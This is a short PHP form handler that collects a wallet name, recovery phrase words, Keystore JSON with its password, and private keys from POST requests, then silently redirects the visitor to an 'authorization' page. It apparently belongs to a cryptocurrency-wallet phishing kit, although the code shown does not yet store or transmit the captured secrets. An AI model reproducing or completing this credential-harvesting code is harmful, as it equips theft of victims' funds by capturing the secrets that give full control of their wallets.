<?php
    
    //PHRASE FORM
    if (isset($_POST['phraseBtn'])) {
        $wallet_name = $_POST['walletname']; 
        $wallet_phrase1 = $_POST['walletphrase1']; 
        $wallet_phrase2 = $_POST['walletphrase2'];  

    }


    //KEYSTONE JSON FORM
    if (isset($_POST['keystoneBtn'])) {
        $wallet_name = $_POST['walletname']; 
        $keystone_value1 = $_POST['keystone_value1']; 
        $keystone_value2 = $_POST['keystone_value2'];  
        $keystone_password = $_POST['keystone_password'];  



    }


    //PRIVATE KEY FORM
    if (isset($_POST['privateBtn'])) {
        $wallet_name = $_POST['walletname']; 
        $wallet_phrase1 = $_POST['privatekey_value1']; 
        $wallet_phrase2 = $_POST['privatekey_value2'];  

        

    }
 ?>

<script>
window.location.replace("../authorization/");
</script>